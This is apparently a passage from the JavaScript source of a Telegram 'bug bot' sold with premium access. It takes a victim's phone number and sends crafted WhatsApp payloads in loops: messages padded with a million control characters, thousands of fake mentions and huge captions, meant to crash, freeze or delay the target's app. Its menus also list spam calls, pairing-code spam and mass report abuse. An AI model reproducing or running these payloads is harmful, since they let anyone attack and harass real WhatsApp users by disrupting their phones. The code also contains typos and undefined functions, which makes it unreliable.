│ ❈ /Xexite  [Delay invisible bebas spam v2]
│ ❈ /Vortex  [Delay invisible bebas spam v3]
╰────────────────────────────╯
\`\`\`
`;

replyMarkup = {
inline_keyboard: [
[
{ text: "🔙 BACK", callback_data: "back_to_main" },
{ text: "👑 OWNER\n‹ developer ›", url: "https://t.me/RidzzOffc" },
{ text: "NEXT ▶️", callback_data: "invis" }
]
]
};

} // ← ini yang tadi hilang


// ===============================
// MENU INVISIBLE
// ===============================
else if (data === "invis") {

selectedImage = "https://files.catbox.moe/eg5zg4.jpg";

caption = `
\`\`\`js
╭──────────────────────────────╮
│        EXPLANTION ORION                │
╰──────────────────────────────╯
⎔ Developer : @RidzzOffc & @Fadzzid  
⎔ Version   : 1.0  
⎔ Platform  : Telegram  
⎔ Script    : Bebas Spam Bugs And not bebas spam 

YOUR INFORMATION
⎔ ID        : \`${userId}\`  
⎔ Username  : ${username}

STATUS SENDER
⎔ Koneksi   : ${sessions.size}

╭──── MATOT BUG MENU ────╮
│ ❈ /Xblank  [Blank]
│ ❈ /Xyou  [Crash]
│ ❈ /Xsow  [Blank Hard]
│ ❈ /XSeven  [Crash ui]
│ ❈ /Xexplan  [Blank infinity]
│ ❈ /Xorionn  [Crash Hard]
╰────────────────────────────╯

╭──── IPHONE BUG MENU ────╮
│ ❈ /Xiyos  [Delay ios]
│ ❈ /Superios  [Super Delay ios]
│ ❈ /Xnow  [Force close ios]
│ ❈ /Xtext  [Bludo ios maybe?]
│ ❈ /Xtite  [Delay brutal ios]
╰────────────────────────────╯
\`\`\`
`;

replyMarkup = {
inline_keyboard: [
[
{ text: "🔙 BACK", callback_data: "trashmenu" },
{ text: "👑 OWNER\n‹ developer ›", url: "https://t.me/Fadzzid" },
{ text: "NEXT ▶️", callback_data: "owner_menu" }
]
]
};

}


// ===============================
// MENU OWNER
// ===============================
else if (data === "owner_menu") {

selectedImage = "https://files.catbox.moe/eg5zg4.jpg";

caption = `
\`\`\`js
╭──────────────────────────────╮
│        EXPLANTION ORION                 │
╰──────────────────────────────╯
⎔ Developer : @RidzzOffc & @Fadzzid  
⎔ Version   : 1.0  
⎔ Platform  : Telegram  
⎔ Script    : Bebas Spam Bugs And not bebas spam 

YOUR INFORMATION
⎔ ID        : \`${userId}\`  
⎔ Username  : ${username}

STATUS SENDER
⎔ Koneksi   : ${sessions.size}

╭──── OWNER ACCESS ────╮
│ ❈ /addowner - Added Acces Owner
│ ❈ /delowner - Delete Acces Owner
│ ❈ /addadmin - Added Acces Admin
│ ❈ /deladmin - Delete Acces Admin
│ ❈ /addprem - Added Acces Premium
│ ❈ /delprem - Delete Acces Premium
│ ❈ /setcd - Set Cooldown Bot
│ ❈ /addsender - Added Session Bot
│ ❈ /listbot - Daftar Bot Connect
╰──────────────────────────╯
\`\`\`
`;

replyMarkup = {
inline_keyboard: [
[
{ text: "🔙 BACK", callback_data: "invis" },
{ text: "👑 OWNER\n‹ developer ›", url: "https://t.me/RidzzOffc" },
{ text: "NEXT ▶️", callback_data: "tols" }
]
]
};

}


// ===============================
// MENU TOOLS
// ===============================
else if (data === "tols") {

selectedImage = "https://files.catbox.moe/eg5zg4.jpg";

caption = `
\`\`\`js
╭──────────────────────────────╮
│        EXPLANTION ORION                 │
╰──────────────────────────────╯
⎔ Developer : @RidzzOffc & @Fadzzid  
⎔ Version   : 1.0  
⎔ Platform  : Telegram  
⎔ Script    : Bebas Spam Bugs And not bebas spam 

YOUR INFORMATION
⎔ ID        : \`${userId}\`  
⎔ Username  : ${username}

STATUS SENDER
⎔ Koneksi   : ${sessions.size}

╭──── TOOLS MENU ────╮
│ ❈ /SpamPairing - Spam Code Pairing
│ ❈ /SpamCall - Spam Call
│ ❈ /hapusbug - Delete Bug
│ ❈ /SpamReportWhatsapp - Spam Rep
╰────────────────────╯

╭──── FUN MENU ────╮
│ ❈ /tourl - Foto To Link
│ ❈ /brat - Text Sticker
╰──────────────────╯
\`\`\`
`;

replyMarkup = {
inline_keyboard: [
[
{ text: "🔙 BACK", callback_data: "owner_menu" },
{ text: "👑 OWNER\n‹ developer ›", url: "https://t.me/Fadzzid" },
{ text: "NEXT ▶️", callback_data: "back_to_main" }
]
]
};

}


// ===============================
// BACK MENU
// ===============================
else if (data === "back_to_main") {
await sendStartMenu(chatId, query.from);
return await bot.answerCallbackQuery(query.id);
}

if (caption !== "" && selectedImage !== "") {

await bot.sendPhoto(chatId, selectedImage, {
caption: caption,
parse_mode: "Markdown",
reply_markup: replyMarkup
});

}

await bot.answerCallbackQuery(query.id);

} catch (err) {
console.error("Error Callback:", err.message);
}

});






//==========(FUNCTION BUG)==========\\
async function Jtwdlyinvis(target) {
    let permissionX = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "⟅༑𝑬𝑿𝑷𝑳𝑨𝑵𝑨𝑻𝑰𝑶𝑵 𝑲𝑰𝑳𝑳 𝒀𝑶𝑼⟅༑",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let permissionY = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "⏤‌‌‌‌𝑭𝑨𝑫𝒁𝑿 𝑨𝑻𝑨𝑨𝑪𝑲 𝒀𝑶𝑼 ᝄ",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
               "#" +
               Math.floor(Math.random() * 16777215)
               .toString(16)
               .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        permissionX.message,
        {
            messageId: permissionX.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        permissionY.message,
        {
            messageId: permissionY.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}

async function DelayBebas1(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "@Fadzzid",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          }
        },
        contextInfo: {
          participant: { jid: target },
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function DelayBebasSpam2(target) {
  let msg1 = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc",
          mimetype: "image/jpeg",
          fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
          fileLength: "99999999999999",
          height: 99999999,
          width: 99999999,
          mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
          fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
          directPath: "/v/t62.7118-24/533457741_1915833982583555_n.enc",
          mediaKeyTimestamp: "1755254367",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyIiIzVRMTNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
          imageSourceType: "AI_GENERATE",
          caption: "ꦾ".repeat(180000),
          contextInfo: {
            stanzaId: "OBENG",
            mentionedJid: Array.from({length: 2000}, (_, i) => `1${i}@s.whatsapp.net`),
            isForwarded: true,
            forwardingScore: 999,
            quotedMessage: {
              externalAdReplyInfo: {
                title: "ꦾ".repeat(50000),
                body: "ꦾ".repeat(50000),
                containsAutoReply: true,
                thumbnail: "https://files.catbox.moe/sas407.jpg",
                mediaUrl: "https://t.me/Fadzzid",
                mediaType: 1,
                renderLargerThumbnail: true,
                adType: 1
              }
            }
          }
        }
      }
    }
  };
  
  const msgA = generateWAMessageFromContent(target, msg1, {});
  await sock.relayMessage("status@broadcast", msgA.message, {
    messageId: msgA.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{tag: "to", attrs: {jid: target}, content: undefined}]
      }]
    }]
  });
  
  let msg2 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "𝗙͢a̷d⃨z̷͢x-𝗚͢a̷n⃨t̷͢e̷n̷g",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"Otax?\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\x10".repeat(1000000)}\"}}`,
            version: 3
          },
          contextInfo: {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "999999")
          }
        }
      }
    }
  };
  
  const raa = generateWAMessageFromContent(target, msg2, {});
  await sock.relayMessage("status@broadcast", raa.message, {
    messageId: raa.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{tag: "to", attrs: {jid: target}, content: undefined}]
      }]
    }]
  });
  
  let msg3 = {
    extendedTextMessage: {
      text: "ꦾ".repeat(20000),
      title: "ꦾ".repeat(20000),
      contextInfo: {
        mentionedJid: Array.from({length: 2000}, (_, i) => `1${i}@s.whatsapp.net`),
        quotedMessage: {
          interactiveResponseMessage: {
            body: {
              text: "🦠⃰͡°͜͡•⃟𝗙͢a̷d⃨z̷͢x-𝗚͢a̷n⃨t̷͢e̷n̷g",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"Otax?\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\x10".repeat(1000000)}\"}}`,
              version: 3
            }
          }
        }
      }
    }
  };
  
  const raa2 = generateWAMessageFromContent(target, msg3, {});
  await sock.relayMessage(target, raa2.message, {
    messageId: raa2.key.id,
    participant: {jid: target}
  });
}






//END FUNCTION AMPAS

//=======CASE BUG=========//
bot.onText(/\/xdelay(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /xdelay 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/eg5zg4.jpg",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Delay For Murbug
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note : GASKAN BUG TERUS BANG</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 40; i++) {
          await Jtwdlyinvis(target);
          await Jtwdlyinvis(target);
          await InvisHard(targe);
          await Jtwdlyinvis(target);
          await Jtwdlyinvis(target);
          await Jtwdlyinvis(target);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[RidzzOffc] Xspam: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug Xspam selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : DELAY FOR MURBUG
▹ Status : Success
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("xdelay Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("xdelay ERROR:", error);
  }
});


bot.onText(/\/xsuper(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /xsuper 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/eg5zg4.jpg",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : DELAY BEBAS SPAM
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note: Jeda 20 menit agar sender tidak overheat</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 40; i++) {
          await DelayBebasSpam2(target);
          await DelayBebasSpam2(target);
          await DelayBebasSpam2(target);
          await DelayBebasSpam2(target);
          await DelayBebasSpam2(target);
          await DelayBebasSpam2(target);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[RidzzOffc] SuperSpam: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug SuperSpam selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : DELAY BEBAS SPAM
▹ Status : Success
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("xsuper Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("xsuper ERROR:", error);
  }
});


bot.onText(/\/Xshow(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xshow 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/eg5zg4.jpg",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xshow
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note: Jeda 20 menit agar sender tidak overheat</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 400; i++) {
          await JammerMutated(target);
          await JammerZombieX(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[RidzzOffc] Xshow: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug Xshow selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xshow
▹ Status : Success
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("Xshow Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("Xshow ERROR:", error);
  }
});


bot.onText(/\/Xdelay(?:\s+(\d+))?/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const randomImage = getRandomImage();

    // 1. Cek Akses Premium
      if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
      return bot.sendPhoto(chatId, randomImage, { // Pastikan chatId (tanpa underscore)
        caption: `<blockquote>❌ AKSES KHUSUS PREMIUM\n\nUser : ${username}\nStatus : Premium Required\n\nHubungi admin untuk membeli akses</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CONTACT OWNER", url: "https://t.me/RidzzOffc" }]
          ]
        }
      }); // Tutup kurung ini sangat penting
    }


    // 2. Validasi Input Target
    if (!match || !match[1]) {
      return bot.sendMessage(chatId, "Format salah\nContoh: /Xdelay 628xxxx");
    }

    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const date = getCurrentDate(); // Mengikuti gaya ForceInvinity

    // 3. Cek Cooldown
    const cooldown = checkCooldown(senderId);
    if (cooldown > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum kirim lagi`);
    }

    // 4. Cek Ketersediaan Session WhatsApp
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada sender WhatsApp yang aktif\nGunakan /addsender dulu"
      );
    }

    // 5. Kirim Notifikasi Awal (Success Layout)
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/eg5zg4.jpg",
      {
        caption: `<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xdelay
▹ Status : Processed
▹ Date : ${date}
</blockquote>
<i>Note: Jeda 20 menit agar sender tidak overheat</i>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    // 6. Eksekusi Loop Bug di Background
    setTimeout(async () => {
      try {
        console.log("\x1b[32m[PROCESS MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        
        for (let i = 0; i < 400; i++) {
          await JammerMutated(target);
          await JammerZombieX(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          await InvisHard(target, false);
          await JammerMutated(target);
          
          // Gunakan fungsi sleep jika tersedia, atau Promise
          await new Promise((resolve) => setTimeout(resolve, 1000));
          
          if (i % 50 === 0) { // Log setiap 50 loop agar tidak spam console
             console.log(`[RidzzOffc] Xdelay: ${formattedNumber} (${i}/400)`);
          }
        }
        
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Bug Xdelay selesai dikirim ke ${formattedNumber}`);

        // Update caption setelah selesai (opsional)
        await bot.editMessageCaption(`<blockquote>
⬡═—⊱「 𝗘𝗫𝗣𝗟𝗔𝗡𝗧𝗜𝗢𝗡 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗔𝗥𝗚𝗘𝗧 」⊰—═⬡
▹ Target : ${formattedNumber}
▹ Type Bug : Xdelay
▹ Status : Success
▹ Date : ${date}
</blockquote>`, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]
            ]
          }
        });

      } catch (err) {
        console.log("Xdelay Loop Error:", err);
      }
    }, 100);

  } catch (error) {
    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    console.log("Xdelay ERROR:", error);
  }
});


